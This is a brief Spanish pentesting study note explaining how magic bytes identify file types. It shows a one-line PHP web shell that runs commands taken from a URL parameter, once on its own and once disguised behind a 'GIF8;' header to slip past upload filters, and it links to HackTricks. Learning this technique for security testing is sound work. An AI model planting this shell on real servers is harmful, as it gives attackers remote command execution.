___
- tags: #file_upload_abussing #owasp 
___
## Números mágicos
Son los primeros bytes de un archivo que indican a que tipo de archivo pertenece.

Por ejemplo:
```php

# este archivo seria reconocido como php
<?php system($_GET['wua']); ?>

# este archivo sera reconocido como un gif
GIF8;

<?php system($_GET['wua']); ?>

```

___
## Referencia
- [File Upload Vulnerability Scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios).
- [File Upload - Hack Tricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html).